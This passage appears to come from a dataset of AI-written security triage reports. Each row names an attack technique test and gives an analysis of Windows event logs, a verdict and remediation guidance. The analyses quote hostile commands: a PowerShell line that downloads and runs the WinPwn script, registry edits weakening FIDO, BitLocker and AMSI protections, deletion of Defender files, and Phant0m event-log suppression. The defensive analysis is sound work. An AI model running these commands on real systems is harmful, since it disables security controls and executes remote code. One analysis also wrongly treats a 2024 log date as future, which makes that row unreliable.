   - Multiple entries showing the execution of PowerShell, `cmd.exe`, `wevtutil.exe`, and other utilities by the `admin_test` account. The execution of these utilities, especially `wevtutil.exe` and PowerShell, can be indicative of malicious intent if not associated with expected operations.
   - There's CMD execution with command-line instructions involving `odbcconf.exe`, which is unusual in some environments and might point to an attempt to execute scripts or modify configurations subtly.

4. **Logon Events**:
   - Repeated logon sessions from `admin_test` with elevated privileges using NTLM from the workstation `DESKTOP-3HL5B2P` suggest possible remote login activities. While NTLM and remote logins can be legitimate, they can also indicate unauthorized remote access attempts.

5. **Edge Update Installer Repeated Execution**:
   - Several Sysmon events related to the Microsoft Edge Update processes executing. These actions are consistent with updating operations, which aren't uncommon, but the frequency and the command lines used (`--verbose-logging`, `--system-level`) could suggest a deeper inspection to ensure these aren't masquerading malicious processes.
   
6. **Exporting Event Logs**:
   - The `wevtutil.exe` process observed is exporting logs, which could be legitimate for monitoring purposes but could also indicate an attempt to exfiltrate logs off the system for analysis by unauthorized parties.

### Assessment:
The activities in the logs prominently involve the `admin_test` account executing system utilities and applications with high-privileged rights. The repeated use of command-line utilities and processes like Edge Updater under SYSTEM privileges, combined with the elevation of privileges, indicate activities that are atypical for a non-administrative user if the context and necessity of the operations aren't properly justified.

### Guidance:
- **Immediate Actions**: Confirm the intent and context behind `admin_test` actions and ensure that they align with authorized administrative tasks.
- **User Behavior Analysis**: Investigate the account activity related to `admin_test`, checking for signs of compromise or unauthorized use.
- **Review Remote Access Configurations**: Inspect security configurations and logs relating to NTLM usage and any remote session activities involving suspicious IP activity or access patterns.
- **Validate Software Update Activity**: Verify if the sequence of events aligns with scheduled updates or if these could be used to disguise unauthorized executions.

### Final Resolution: **SUSPICIOUS**
The log entries suggest activities that are unusual enough to warrant further investigation to rule out any unauthorized or malicious intent. Further inquiry may validate the benign nature of this activity or reveal more concerning intrusion patterns."
Activities To Disable Microsoft [FIDO Aka Fast IDentity Online] Authentication Detected By Modified Registry Value,"After thoroughly analyzing the provided Windows event logs, here is an assessment of the situation:

1. **EdgeUpdate Activity**: The logs show numerous executions of processes related to Microsoft Edge Update, which occurs with the ""NT AUTHORITY\\SYSTEM"" user. This is typical behavior for update services and does not inherently indicate malicious activity.

2. **Scheduled Tasks and Services**: The regular use of processes like MicrosoftEdgeUpdateSetup.exe and MicrosoftEdgeUpdate.exe with various execution arguments (e.g., /update, /svc) suggest scheduled update tasks or services completing their update cycles and requests.

3. **Unexpected Registry Modification**:
   - The command `reg add ""HKLM\\SOFTWARE\\Policies\\Microsoft\\FIDO"" /v ""AllowExternalDeviceSignon"" /t REG_DWORD /d 0 /f` was executed from a cmd.exe process. This change to the Windows Registry modifies policy settings related to FIDO, which involves authentication configurations.
   - Moreover, this action was executed by a user named `SERVER002\\admin_test` with high integrity level. This could be suspicious if the modification of such a registry was not part of an administrative maintenance task. Without context or known scheduled tasks requiring such changes, altering authentication settings in the registry can be a red flag for tampering or preparation for another malicious activity.

4. **Use of System Utilities**:
   - The execution of `wevtutil.exe` and `conhost.exe` by the user `SERVER002\\admin_test` frequently appears in these logs. The pattern seems repetitive and unusual, suggesting possible script automation or batch processing, which could be associated with log management or clearing, potentially hiding previous or ongoing malicious actions.

5. **Use of Common Windows Tools**: The `whoami.exe` process was invoked, which is generally used to verify the current user's privileges. Although often normal, when combined with registry modifications without context or prior events demanding user verification, it may indicate an exploration of user rights or an attempted privilege escalation.

**Final Assessment**:
- **Resolution**: SUSPICIOUS
- **Reason**: While the Edge update activities align with system update processes, the registry modification of a key affecting authentication settings, combined with repeated invocations of system tools by a local admin user (`SERVER002\\admin_test`), indicates potentially anomalous behavior. Additional investigation is warranted to determine if these actions align with scheduled maintenance tasks or if they are unauthorized modifications with possible malicious intent.

**Guidance**:
- Verify the purpose and authorization of the registry modification by `SERVER002\\admin_test`.
- Check for scheduled tasks or maintenance activities that could justify these actions.
- Review any recent changes in task scheduling or administrative scripts that involve the use of `wevtutil.exe`, `whoami.exe` and registry editing.
- Conduct a deeper inspection into the activities surrounding `SERVER002\\admin_test` to ensure no privilege escalations or malicious configurations are being set."
Disable Defender Using NirSoft AdvancedRun,"After analyzing the provided logs, here is a detailed assessment of the situation:

### Observations:

1. **Unusual Use of PowerShell**:
   - There are multiple instances of PowerShell being executed (`C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe`) in conjunction with command-line instructions that appear suspicious. 
   - A specific event indicates PowerShell trying to execute a script intended to stop the ""WinDefend"" service using AdvancedRun.exe, suggesting an attempt to disable Windows Defender.
   - The command includes a potential attempt to delete Windows Defender files: `rmdir ""$env:programdata\\Microsoft\\Windows Defender"" -Recurse`.

2. **Use of AdvancedRun.exe**:
   - AdvancedRun.exe, a NirSoft utility, is being used to execute commands with specific parameters (`/RunAs 8`), indicating an attempt to elevate privileges or run as a different user context.
   - The combination of its usage with commands stopping Windows Defender and potentially manipulating system files is a significant indicator of malicious intent.

3. **High Integrity Level Execution**:
   - The commands executed have a high integrity level, indicating that the processes have elevated privileges, which need careful assessment to ensure they are legitimate.

4. **Microsoft Edge Update Activities**:
   - Multiple entries indicate the execution of `MicrosoftEdgeUpdate.exe`, which in itself is not unusual as it is part of the software updates, but its occurrences are dense around the suspicious PowerShell activity timing, rising the question of any potential use as a cover for malicious activities.

5. **Logging Exact Date**:
   - The logs are dated for future entries (October 28, 2024), so the completeness and authenticity of provided logs need verification to ensure they are not tampered with.

### Threat Assessment:

The activities indicated, specifically the attempts to disable security services like Windows Defender using PowerShell and third-party tools to run commands with elevated privileges, are clear indicators of potentially malicious behavior. The commands seem crafted to avoid detection by potentially altering system defenses.

### Guidance on How to Proceed:

1. **Immediate Isolation**:
   - Isolate the affected host (Server002) to prevent any further unauthorized activities or lateral movement within the network.

2. **Conduct a Thorough Malware Analysis**:
   - Search for other malicious activities or malware dropped by analyzing other running processes, file changes, and registry modifications during the log time frame.

**MALICIOUS**

Immediate actions are recommended to mitigate risks and prevent further potential damage."
Modify UsePIN Registry entry,"Based on the analysis of the provided Windows event logs, several activities appear noteworthy:

1. **EdgeUpdate Activity**: The Sysmon logs reflect multiple instances of MicrosoftEdgeUpdate.exe and related processes being executed. Microsoft Edge Update is a legitimate process used by Microsoft to update the Edge browser. The repetition of its activities can be attributed to scheduled updates or installation processes, which is generally benign behavior. The Edge Update processes logged do not show any irregular or unexpected command-line arguments that might indicate malicious activity.

2. **Use of Command-Line Tools**: The execution of `cmd.exe` with the command `reg add ""HKLM\SOFTWARE\Policies\Microsoft\FVE"" /v UsePIN /t REG_DWORD /d 2 /f` stands out. While the use of registry manipulation through `reg.exe` might be typical in certain administrative tasks, if it was not expected or conducted without explicit administrative intentions, it might be suspicious. The entry manipulates a BitLocker policy that could have security implications.

3. **Time Synchronization Adjustments**: The Kernel-General and Time-Service logs indicate multiple adjustments to the system time. The changes seem synchronized with time updates, showing interaction possibly with time servers like ""time.windows.com."" This is typical behavior for NTP time synchronization and does not suggest a direct sign of malicious intent, provided these adjustments align with organizational policies.

4. **User Activity**: Specific logs indicate command execution conducted by the user `SERVER002\admin_test`. It appears there are actions involving command-line executions like `whoami.exe` and `HOSTNAME.EXE`. Their use can be routine, but should be verified if they align with the administrative tasks expected around this timestamp or if they were conducted under legitimate conditions.

5. **Admin/User Actions**: The execution of `wevtutil.exe`, a tool for managing Windows event logs, by `SERVER002\admin_test` might indicate log handling activities. If the user is authorized and performing regular administrative tasks, these logs are benign. Otherwise, unauthorized or unexpected execution could suggest tampering or log manipulation.

**Conclusion**:
- The EdgeUpdate activities appear BENIGN as the logged processes and command lines match standard update behavior for Microsoft Edge.
- The command-line modification of registry settings, notably affecting BitLocker policies, is SUSPICIOUS due to potentially altering security settings unless clearly justified.
- Time synchronization logs reflect ordinary system behavior.
- However, user `SERVER002\admin_test` running potentially sensitive processes, particularly registry changes, elevate this activity to a SUSPICIOUS level, necessitating further investigation into the legitimacy and intent of such changes.

**Resolution: SUSPICIOUS**

**Next Steps**:
- Confirm if the registry modification aligns with legitimate IT policies or any planned administrative changes.
- Verify the context and justification for the log and process interactions initiated by `SERVER002\admin_test`.
- Implement log monitoring for any subsequent related activities and ensure all security settings, particularly involving BitLocker, are in compliance with security policies.
"
Makes Eventlog blind with Phant0m,"Upon analyzing the provided Windows event logs, several activities stand out that warrant closer examination for potential malicious behavior. Here’s a detailed breakdown:

1. **Process Execution and Parent-Child Relationships:**
   - A significant occurrence is the execution of `cmd.exe` with a command line referencing `Phant0m.exe` located in a temporary directory. `Phant0m.exe` is known as a tool used by attackers to hide Windows Event Logs by terminating specific system services. This is executed by `cmd.exe`, which itself was spawned by `wsmprovhost.exe`, a common system management and remote command host. This behavior is highly suspicious and indicative of malicious activity aiming to obfuscate system activities.
   
2. **Use of Sysinternals and Administrative Tools:**
   - The execution of `wevtutil.exe` (a tool used to manage Windows event logs) and `conhost.exe` repeatedly within fractions of a second could indicate attempts to manipulate or control console applications, potentially for log manipulation or command execution.

3. **Shell and Utility Executions:**
   - Frequent execution of system utilities like `HOSTNAME.EXE`, `whoami.exe`, and `console applications (conhost.exe)` under the context of an administrative user suggests potential reconnaissance attempts or privilege abuse, especially combined with the elevated integrity level observed.

4. **Security Event Logs:**
   - The presence of Event ID 4624 (An Account was successfully logged on) and Event ID 4672 (Special privileges assigned to new logon), indicating login events with privileges like `SeDebugPrivilege`, `SeTakeOwnershipPrivilege`, and others, might be typical, but they follow closely after the launch of suspicious processes, thus raising red flags for privilege escalation attempts or misuse.

5. **Anomalous Application Behavior:**
   - The application logs show routine service operations but in conjunction with potential file manipulation (such as temporary directories and specific filenames like `Phant0m.exe`), it suggests leveraging of legitimate processes for nefarious purposes.

### Conclusion and Resolution:
Given the combination of these events, especially the usage of `Phant0m.exe` which is a known malicious tool paired with unusual system command executions and privilege escalations, I classify these logs as **MALICIOUS**. It is likely that the system has been compromised with intent to hide malicious activities by clearing or manipulating event logs.

### Guidance:
1. Immediate isolation of the affected system to prevent further exploitation.
2. Conduct a thorough forensic investigation focusing on the command execution paths and network communication for potential exfiltration.
3. Remove identified malicious binaries and restore event log services if terminated.
4. Evaluate user account behaviors for potential compromise and change credentials.
5. Review and possibly enhance logging and monitoring policies to detect similar patterns in the future."
Hide Files Through Registry,"### Detailed Analysis of Logs:

#### System Logs:
- **Event 3569 - 3573**: These events reflect changes in the system time. Time synchronization changes often involve `svchost.exe` and are normal if the Windows Time Service is adjusting the clock. All processes appear to involve `\\Device\\HarddiskVolume2\\Windows\\System32\\svchost.exe` and are consistent with the behavior of automatic time adjustments using a trusted time source (e.g., `time.windows.com`).

The sequence of `cmd.exe` and `reg.exe` execution involves modifying registry keys related to hidden files. This is a slight anomaly, but the `cmd.exe` activity is not uncommon in administrative tasks.
  - **Events (Key Focus)**:
    - **Event 17982 - 17986**: A `cmd.exe` process runs commands to modify registry settings to hide system files. This could be normal if an administrator is configuring system visibility settings but could also signal an attempt to conceal files by malicious software.
    - **Event 18018 and others**: Series of events related to `MicrosoftEdgeUpdate.exe`, update activity for Microsoft Edge. They reflect normal updating procedures.
  - **Assessment**: 
    - The `cmd.exe` and `reg.exe` execution warrant attention—it depends on whether these registry changes were expected or intended by an authorized admin.
    - Microsoft Edge updates appear normal.

#### Security Logs:
- **Events 30351 - 30352**: Reflects time change events by the Local Service. They coincide with the System Log time adjustment events.
  - **Assessment**: Reflects expected behavior of system-level time adjustments.

### Conclusion & Resolution:

- **Assessment Summary**:
  - **BENIGN**: System time changes and Edge updates are routine.
  - **SUSPICIOUS**: The use of `cmd.exe` and `reg.exe` to alter registry settings raises some suspicion, but without more context (e.g., who executed these changes), this remains an activity to potentially investigate, especially if there is no legitimate need for such actions.

- **Final Resolution**: **SUSPICIOUS**

- **Guidance**: It is recommended to follow up on the changes made by `cmd.exe` and `reg.exe`. Verify if there is an authorized cause behind the registry edits. If not, this may require deeper investigation to ensure there has been no unauthorized access or modification. You should confirm with the end user or check scheduled tasks or scripts that might have performed these actions."
Disable Windows Auto Reboot for current logon user,"Upon analyzing the provided Windows event logs from a host system, I have focused on identifying any indicators of potentially malicious activity, such as irregular processes, unexpected command-line executions, or unauthorized privilege changes. Here are the key observations:

1. **System Log Analysis:**
   - The system log entries mainly revolve around time synchronization events (`EventID 24` and `EventID 1`), indicating normal operations related to system time adjustments by Windows Time Service using `svchost.exe`. There is no evidence of suspicious or unauthorized time changes.

2. **Sysmon Log Analysis:**
   - The log contains multiple entries related to typical system processes:
     - Processes like `wevtutil.exe` and `conhost.exe` are seen repeatedly executed by `SERVER002\admin_test`, with no specific irregularities in their command-line arguments or actions that would indicate alarming activities.
     - An instance of `cmd.exe` executing a registry modification: `reg add ""HKLM\SOFTWARE\Policies\Microsoft\Windows\WindowsUpdate\AU""`. This registry key is often modified by administrators to control automatic reboots after updates. While it can indicate administrative control (such as ensuring a stable environment), it may also be suspicious if not aligned with organizational policies.

3. **Security Log Analysis:**
   - The entries here (`EventID 4616`) pertain to time changes, which correlate with events logged in the System log. They reflect expected updates to system time with no indications of unauthorized privilege activity or usage outside standard operations.

4. **Application Log Analysis:**
   - Primarily, there are logs related to the `Software Protection Platform Service` and application-specific updates (`edgeupdate`). These present logs of typical system events and service status changes.

5. **EdgeUpdate Processes:**
   - Multiple instances of `Microsoft Edge Update` processes are logged, demonstrating updates were carried out. This involves system-level operations under the NT AUTHORITY\SYSTEM account, which is standard for legitimate update processes of software like Microsoft Edge. These processes do not exhibit command-line parameters or parent processes that suggest tampering.

**Assessment:**
- The logs mostly consist of standard operations and system maintenance tasks, such as time updates and application service updates. The execution of the `cmd.exe` for modifying Windows Update settings could be seen as suspicious if it was performed unexpectedly or unauthorized as part of a larger intrusion attempt. However, it can also be legitimate administrative activity.

**Resolution:** SUSPICIOUS

**Guidance:** 
- Further investigate the specific context of the registry modification initiated by `cmd.exe`. Verify this change aligns with administrative activity and follows organizational policies. Consider investigating the user `admin_test` for authorized actions and reviewing their purpose and changes in the context of system management. Additionally, ensure that no unexpected or unexplained services or processes are present on the host system that could suggest compromise or misuse. "
Windows HideSCANetwork Group Policy Feature,"Based on the provided Sysmon and application logs, let's break down the analysis for evidence of any malicious activity:

### Observations:

1. **Process Execution**:
    - Several instances of `MicrosoftEdgeUpdate.exe` and related components (e.g., `MicrosoftEdgeUpdateComRegisterShell64.exe`) are executed under the `NT AUTHORITY\SYSTEM` user, indicating they were run with high-level privileges, which is expected for system or service processes.
    - The command lines used for these processes (`/regsvc`, `/regserver`, `/ua`, `/svc`) are standard for software update cycles.
    - Processes related to system utilities like `whoami.exe`, `HOSTNAME.EXE`, and `svchost.exe` are noted, which are common for legitimate system activities.
    
2. **Command Line Suspicion**:
    - At one point, a `cmd.exe` process is seen executing a command to modify the registry: 
      ```
      ""cmd.exe"" /c reg add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v HideSCANetwork /t REG_DWORD /d 1 /f
      ```
    - This command attempts to add or modify a registry entry, which could influence user policies, such as hiding specific network options. Without legitimate justification, registry changes via `cmd.exe` could indicate malicious or unauthorized activity.

3. **Event Context**:
    - The `wevtutil.exe` tool, which manages event logs, appears multiple times, possibly indicating interaction with event logs. Without further context, this can be benign (e.g., clearing or archiving logs) but might also suggest log tampering.
  
4. **Timing and User Activity**:
    - The activities predominantly involve the user `SERVER002\admin_test`, using elevated privileges, which could be typical for administrative tasks. However, without validation against known maintenance windows or authorized user actions, the context remains uncertain.

5. **Application Log**:
    - Contains a single relevant entry indicating the ""Service stopped"" for the Edge Update process, suggesting likely routine activity related to the end of an update cycle.

### Assessment:
Analyzing these logs reveals mostly benign updates and legitimate system activity. However, the command involving registry manipulation raises suspicion, primarily if there is no record of authorized administrative actions justifying this change.

### Conclusion:
**Resolution: SUSPICIOUS**

### Recommendations:
1. **Further Investigation**: Verify the purpose and authorization of the registry modification command. Check with responsible IT staff for any scheduled changes during the log times.
2. **Monitoring**: Enable more detailed logging or auditing for registry changes and elevated command execution to ensure legitimacy and catch unauthorized modifications swiftly.
3. **User Activity Review**: Assess the activities linked with `SERVER002\admin_test` to verify they align with expected administrative actions and timing."
Execution from Compressed File,"Based on the Windows event logs provided, a detailed analysis of the logs reveals the following points of interest and potential indicators of malicious activity:

### Suspicious Activity

1. **Unusual Execution Path:**
   - There is an execution of `cmd.exe` with a command line executing a file located in a temporary directory: 
     ```json
     ""CommandLine"": ""\""cmd.exe\"" /c \""C:\\Users\\ADMIN_~1\\AppData\\Local\\Temp\\file\\..\\Externalfiles\\temp_data.zip\\data.exe\""""
     ```
   - This is followed by the execution of `data.exe`, which is suspicious because legitimate processes rarely execute files directly from such temporary paths. This behavior can indicate the execution of potentially malicious payloads often observed in malware infections.

2. **Abnormal Process Relationships:**
   - The execution of `whoami.exe` and `HOSTNAME.EXE` from paths and processes under `admin_test` could be legitimate, but coupled with the `cmd.exe` execution mentioned earlier, it begs further scrutiny for intentions or scripted actions.

3. **Potential Persistence Mechanisms:**
   - The conhost.exe instances do not display unusual behavior; however, conhost.exe might often be seen in legitimate operations. But it's worth verifying these executions because conhost.exe can be used as a masquerading technique by malicious actors.

4. **Process Context:**
   - Processes are executed under a high integrity level using `SERVER002\\admin_test`, giving them elevated privileges, which can be leveraged for malicious actions, especially concerning privilege escalation attempts.

5. **File Utilization:**
   - Frequent use of `wevtutil.exe`, which is a utility for managing event logs, may suggest log tampering if not properly contextualized.

### Benign or Expected Activity

1. **Microsoft Edge Update:**
   - Multiple entries referencing Microsoft Edge Installer processes, executed under `NT AUTHORITY\SYSTEM`, with proper file descriptions and versions. These appear to be legitimate software updates.

2. **Windows Update Activities:**
   - Execution of `wuauclt.exe` and related processes, which are standard operations for updating system components.

3. **System and Security Updates:**
   - Activities related to updating Microsoft Defender and AntiMalware signatures are normal for maintaining security posture.

### Resolution

Based on the assessment of the logs:
- **Resolution: SUSPICIOUS**

### Guidance on How to Proceed

1. **Isolate and Investigate:**
   - The machine should be isolated from the network immediately to prevent any potential lateral movement.

By following these steps, you'll be better positioned to confirm or dismiss the suspicions of malicious activity, securing this machine and potentially others within the network environment."
Invoke HTML Application - JScript Engine with Inline Protocol Handler,"Upon analyzing the provided Sysmon logs and Windows PowerShell logs for the given host, we have identified several activities that warrant attention.

1. **PowerShell Execution with Suspicious Command**:
   - The Sysmon EventID 1 indicates that PowerShell was executed with the following command: `""powershell.exe"" & {Invoke-ATHHTMLApplication -ScriptEngine JScript -InlineProtocolHandler About -MSHTAFilePath $env:windir\system32\mshta.exe}`. This command invokes a PowerShell command that appears to be trying to run a script within an HTA file using the mshta.exe. The use of 'ScriptEngine JScript' and 'MSHTAFilePath' is often associated with malicious activities, such as execution of scripts or obfuscated commands that could bypass traditional security tools.
   
2. **High Frequency of Sysmon EventID 5**:
   - There is a high frequency of Sysmon EventID 5, which logs that processes such as `conhost.exe`, `wevtutil.exe`, and `setup.exe` among others, are being executed within short time spans. While these can be benign under normal circumstances, conhost.exe running in conjunction with tools like Powershell might indicate script execution, potentially using console windows to manage outputs or logs. 
   - The `wevtutil.exe` process is often used to export, archive, and clear event logs, which, if done without legitimate reasons, can be synonymous with an attacker attempting to cover their tracks.

3. **Execution as NT AUTHORITY\SYSTEM**:
   - Some of the processes such as `setup.exe` and `svchost.exe` are executed under the `NT AUTHORITY\SYSTEM` user context, suggesting they are running with high privileges. While this might be normal for system updates, frequent execution in such a short timespan could be a red flag if occurring outside an expected update window, as attackers often attempt to run processes with elevated privileges to gain more control over the system.

4. **PowerShell Logs**:
   - The PowerShell logs exhibit consistent execution patterns of a high-privileged `ConsoleHost` environment starting processes with unusual arguments. The command pipeline suggests potential script execution attempts that should be investigated further.

### Conclusion:

Based on the analysis, the logs contain activities that are **SUSPICIOUS**. There is evidence of potentially malicious script execution using PowerShell and possibly attempts to manipulate or erase system logs. However, without additional context such as a network traffic analysis or insight from other security logs (which are not included here), a definitive conclusion about a malicious compromise cannot be drawn. The activities observed in the logs need more investigation to confirm whether they are legitimate administrative actions or malicious activities.

### Guidance:

1. **Immediate Action**: 
   - Close and isolate the associated host from the network until further investigation can verify the nature of these suspicious activities.
   - Retrieve more detailed logs around the timeframes observed to gain insights into potential lateral movement or data exfiltration.

2. **Forensic Analysis**: 
   - Conduct a deeper forensic analysis of the system to inspect any potential changes made by the script and verify if any unauthorized modifications were made to the system.

3. **Behavioral Analysis**: 
   - Monitor for similar activities in the organization to identify patterns or potential linked incidents.

4. **Implement Controls**:
   - Review and tighten PowerShell logging configurations to ensure all scripts and command arguments are appropriately logged.
   - Reinforce user education about spear-phishing tactics and encourage reporting of suspicious emails which might have led to such activity.

Proceed with caution, investigating these suspicious activities comprehensively before taking further action."
WinPwn - Kill the event log services for stealth,"After reviewing the provided event logs from the Windows host, I've identified a number of activities that warrant further analysis due to suspicious indicators of potential compromise:

1. **PowerShell Activity**:
   - There are several PowerShell events that indicate a script being executed with command lines that download and execute content from a remote repository (`https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn`). The specific command executed:
     ```
     ""powershell.exe"" & {$S3cur3Th1sSh1t_repo='https://raw.githubusercontent.com/S3cur3Th1sSh1t', iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1'), inv-phantom -consoleoutput -noninteractive}
     ```
   - This type of PowerShell usage to download and run a script from the internet can be indicative of ""fileless malware"" or a part of a penetration testing framework or attack known as ""living off the land.""

2. **Sysmon Logs**:
   - There are multiple instances of `wevtutil.exe` and `conhost.exe` being executed by `SERVER002\admin_test` within a very short period, which alone might not be particularly suspicious but should be correlated with other behaviors.
   - The WindowsHostName, whoami, and Powershell are executed by high integrity level users which indicates these might be part of post-exploitation activities.

3. **Edge Update**:
   - There is extensive logging related to `MicrosoftEdgeUpdate.exe`, which involves processes run by `NT AUTHORITY\SYSTEM`. While Edge updates can occur regularly and be benign, given the context and high level of system privilege, it may reflect either legitimate updates or potentially abuse of the process if other suspicious behavior is detected in parallel.

**Assessment**:
- The PowerShell activity, especially involving the execution of external scripts from the internet, combined with usage of `whoami` and high integrity processes, raises strong suspicions of post-exploitation behavior. While such actions can occasionally be legitimate depending on administrative tasks, the persistence, method (i.e., downloaded script execution), and context suggest possible malicious intent.

**Resolution: SUSPICIOUS**:
- Given the outlined activities, particularly the PowerShell command execution, there are sufficient grounds to consider this activity suspicious and warranting further investigation.
  
**Guidance for Further Actions**:
1. **Containment**: 
   - Monitor the system for any further external connections or script executions, and restrict network access if further suspicious activity is observed.
   
2. **Investigation**: 
   - Verify with system administrators if the aforementioned PowerShell scripts were part of any planned or legitimate administrative tasks or configurations.
   - Review any additional logs, such as network logs, to identify potential data exfiltration or further access attempts.
   - Examine the integrity and origin of downloaded scripts and consider them for possible removal or quarantine.
   - Conduct a thorough malware scan and security audit of the system.

3. **Preventative Measures**:
   - Implement script block logs and monitor PowerShell activities closely.
   - Strengthen network defenses by using firewalls, intrusion detection/prevention systems, and regular audits.
   - Educate users about the phishing risks and unauthorized script execution."
AMSI Bypass - Remove AMSI Provider Reg Key,"Upon analyzing the provided Windows event logs, here is my detailed assessment:

### Suspicious and Anomalous Behaviors:
1. **PowerShell Activity**: There is a PowerShell process initiated with the command line that involves removing registry keys under `HKLM:\SOFTWARE\Microsoft\AMSI\Providers\`. This command (`Remove-Item -Path ""HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{GUID}"" -Recurse`) is suspicious because it targets the ""Antimalware Scan Interface"" (AMSI) which is often targeted by malware to evade detection from security software.

2. **Repeated Execution of Processes**:
   - There are multiple instances of `wevtutil.exe` and `conhost.exe` executions by the user `SERVER002\admin_test` within a very short time frame. While not inherently malicious, high frequency of such activity can indicate scripting or automation typically associated with unauthorized or suspicious activities.

3. **Time Stamp Alterations**:
   - Kernel-General events (EventID: 1) show multiple updates to the system time occurring simultaneously. Clock manipulation can be used by attackers to cover tracks or to interfere with timestamps in logs.

### Indicators of Malicious Activity:
- The PowerShell attempt to remove AMSI providers is a strong indicator of potentially malicious activity as this is a common tactic used in malware campaigns to ensure their payload executes without interruption from AV solutions.
  
### Assessment of the Situation:
- The PowerShell command to remove AMSI Providers is a **red flag** for potential malware activity. This suggests an attempt to bypass or disable antimalware defenses, a tactic frequently employed in attacks for further exploitation.
- The high number of `wevtutil.exe` and `conhost.exe` executions could suggest further scripting activity, although this is less conclusive than the PowerShell invocation.

### Conclusion:
- **Resolution**: MALICIOUS
  - The logs provided contain clear indicators of malicious activity, notably the manipulation of system settings typically targeted for evasion, suggesting the potential presence of malicious software or exploitation scripts.

### Guidance on How to Proceed:
1. **Immediate Containment**: Isolate the host from the network to prevent further spread or damage.
2. **Detailed Forensic Analysis**: Perform a comprehensive investigation to determine the extent of the compromise, focusing on the PowerShell scripts' origin and any other abnormalities.
3. **Review Security Policies**: Ensure that appropriate access controls and monitoring are in place to detect and prevent similar activities.
4. **System Remediation**: Consider reinstalling the operating system to guarantee the system is clean and apply all necessary patches and updates.
5. **User Education**: Educate users on safe computing practices and recognize unusual activity, reducing the likelihood of such issues recurring in the future."
Adding custom paths for application execution,"Upon reviewing the provided Windows event logs, the following analysis can be made:

### Sysmon Log Analysis
1. **Process Creation Events:**
   - The frequent execution of `wevtutil.exe` and `conhost.exe` could indicate standard administrative activity, but the repeated execution close in time warrants closer examination. Specifically, `wevtutil.exe` is commonly used for managing event logs which can be legitimate but can also be exploited for clearing logs during malicious activity.
   - The execution of `cmd.exe` with a command to modify the registry (`reg add`) indicates a potential compromise. Specifically, setting `msedge.exe` to execute `notepad.exe` can be used to hijack legitimate processes for malicious purposes.

2. **Command Execution:**
   - The registry modification using `cmd.exe` suggests potential misconfiguration or intent to alter system behavior by pointing the execution of `msedge.exe` to `notepad.exe`. This behavior can bypass application control policies or can be used to masquerade malicious activities under benign process names.

3. **Integrity Level and Privileges:**
   - The integrity level of the executing processes is ""High"", denoting administrative privileges. As the sequence of events involves registry manipulation and querying user information, this could imply attempts to leverage elevated privileges for wider access or system changes.

### Security Log Analysis
1. **Logons and Privilege Use:**
   - Detection of a logon event (4624) using the NTLM authentication package suggests legitimate or coerced access was gained. The source IP `192.168.0.102` should be assessed for known trusted or suspicious activity.
   - The event (4672) shows the enabling of some sensitive privileges such as `SeDebugPrivilege` and `SeTakeOwnershipPrivilege`, which are concerning if enabled without clear purpose, possibly indicating elevated access reconnaissance or attack preparation.

2. **Logoff Events:**
   - The logoff event (4634) for user `admin_test` represents expected activity following a remote logon, aligning with a potentially administrative role but still merits consideration as part of the log sequence.

### Application Log Analysis
1. **Service Activity:**
   - The activity involving `edgeupdate` services does not immediately indicate suspicious behavior; however, given these intersect with other events and processes (especially related to registry alterations via sysmon logs), they add context to the investigation. 

### Assessment and Recommendations
- The logs indicate **SUSPICIOUS** activity primarily due to the registry modification and the possible misuse of administrative privileges. While some process executions might reflect legitimate administrative actions, the specific command executed and registry changes warrant further investigation.
- **Next steps:**
  - Validate whether user `admin_test` executed these actions knowingly.
  - Examine `192.168.0.102` for legitimacy within the network.
  - Check for any similar activities or prior security incidents involving registry or process execution changes.
  - Consider examining shadow copies or backups to ensure that no unauthorized malicious changes have occurred.
  - Engage in network monitoring for any outbound connections from `Server002` potentially indicating data exfiltration or unauthorized communication.

- The resolution is marked **SUSPICIOUS**, necessitating further investigation to conclusively determine benign versus malicious intent."
Modify EnableBDEWithNoTPM Registry entry,"### Detailed Analysis of the Logs:

1. **Application Log:**
   - **Software Protection Platform Service (Event ID: 16384):** This event generally logs event information related to the activation and software protection aspects of Windows operating systems. The log at `2024-10-24 18:38:41.6755448` does not show any suspicious behavior. It simply indicates a rules engine action.
   - **Edge Update Service Stopped:** The event at `2024-10-24 18:38:43.6338501` indicates that the Microsoft Edge Update service has stopped. This is typical of service processes that are periodically initiated and terminated as part of their update routines.

2. **System Log:**
   - **Time Changes (Event ID: 1):** Multiple events indicate time changes managed by `svchost.exe`, which is a generic host process name for services that run from DLLs in Windows. The time changes can be associated with synchronization with an external time source (`time.windows.com`), generally non-malicious unless there are signs of tampering with time settings.
   - **Kernel-General (Event ID: 24):** Multiple events indicating TimeZone setting changes, which aligns with NTP synchronization, are normal operations.

3. **Sysmon Log:**
   - **Process Creation Events (Event ID: 1):** Several processes are created, primarily related to Microsoft Edge Update executables (`MicrosoftEdgeUpdate.exe`). Notably, the process `cmd.exe` executes a registry change with `reg.exe`, modifying a policy to enable BitLocker without TPM: `\""cmd.exe\"" /c reg add \""HKLM\\SOFTWARE\\Policies\\Microsoft\\FVE\"" /v EnableBDEWithNoTPM /t REG_DWORD /d 1 /f`. This registry change is significant as it appears to be conducted with admin rights, potentially to alter security settings on the system.
   - **Process Termination Events (Event ID: 5):** Numerous terminations of the same EdgeUpdate processes are present, suggesting normal update and process cycling behavior.
   - **CommandLine Execution:** The presence of `cmd.exe` with a potentially sensitive registry modification, particularly regarding encryption policies, could suggest unauthorized settings alteration or administrative policy bypassing.

4. **Security Log:**
   - **System Time Changes (Event ID: 4616):** Time changes are logged similar to the system log, in line with expected behavior from time service adjustments.

### Assessment:

- **Anomalies and Suspicious Behavior:** The modification of the registry to enable BitLocker without TPM is a critical security setting adjustment that could indicate an attempt to weaken security posture by bypassing hardware-based security features.
- **Process Execution Patterns:** The creation of processes with administrative privileges for making registry changes, like disabling TPM requirements for BitLocker, stands out as needing further scrutiny.

### Threats/Risks Identified:

- The specific registry change regarding BitLocker indicates a potential security risk as it adjusts encryption policies unexpectedly, possibly exposing the system to data protection vulnerabilities.

### Guidance:

- Conduct an immediate review of administrative activity for the `SERVER002\admin_test` account for unauthorized actions.
- Verify if the registry change was in line with organizational policy and intended by legitimate administrators.
- Investigate related systems interactivity, especially other logs for network activity or unauthorized access communications.
